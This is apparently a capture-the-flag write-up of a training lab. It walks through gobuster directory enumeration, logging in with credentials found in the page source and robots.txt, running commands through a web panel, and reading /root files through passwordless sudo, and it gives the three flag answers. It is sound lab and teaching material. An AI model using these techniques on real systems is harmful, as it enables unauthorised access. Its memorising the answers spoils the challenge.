
# What is the first ingredient that Rick needs?

Navigate to website, plain text with image, Wappalyzer shows Apache 2.4.18, Ubuntu, JQuery and Bootstrap.  No hidden text on screen, viewing the source we can see a username listed as `R1ckRul3s`

Guessed a `/login.php` form, and we get a logon page.  No hidden text, nothing interesting in source

check `/robots.txt` - found `Wubbalubbadubdub`

run Gobuster
`gobuster dir -u $target -w /usr/share/dirb/wordlists/common.txt`
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.163.83
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/assets               (Status: 301) [Size: 313] [--> http://10.10.163.83/assets/]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Checked the `/assets` page, this appears to be images used, and the css and js files.

Use the username from the source, and the `Wubbalubbadubdub` as the password on `/login.php`

That allows us to access a portal of sorts
The `commands` tab works, but the others `Potions`, `Creatures`, `Potions`, `Beth Clone Notes` all redirect to `denied.php`

The source of the `portal.php` page has a base64 encoded string.  Decoding this gives a bse64 string.  Decoding this repeatedly tells us this is a `rabbit hole`

Entering the command `whomai` in the commands gives us `www-data` in response.
`pwd` returns `/var/www/html`
`ls` returns
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

`cat Sup3rS3cretPickl3Ingred.txt` returns a block message and the fail image from the `/assets` page

Trying to `cat` various files give the same error.

Navigating in the browser to `/clue.txt` returns `Look around the file system for the other ingredient.`

Navigate to `/Sup3rS3cretPickl3Ingred.txt` returns the first ingredient.

Answer: `mr. meeseek hair`

# What is the second ingredient in Rick’s potion?

Using the command from the website, we look in `/home/rick` and we see `second ingredients`

Use the command
`cp "/home/rick/second ingredients" /var/www/html/second.txt` but this didn't seem to work
`cp "/home/rick/second ingredients" /tmp/second.txt` did seem to copy the file to `/tmp/` but still couldn't copy it to the web directories.

`ul < /tmp/second.txt` provided the answer

Answer: `1 jerry tear`

# What is the last and final ingredient?

Run the command `sudo -l` to see what commands we can run with `sudo` and we get `(all) NOPASSWD: ALL` meaning we can sudo without a password all commands.
Lets test it
`sudo ls -la /home/ubuntu/` seems to work
`sudo ls -la /root/` shows a `3rd.txt`
`sudo ul < /root/3rd.txt` didn't run, however `sudo less /root/3rd.txt` did providing the 3rd ingredient

Answer: `fleeb juice`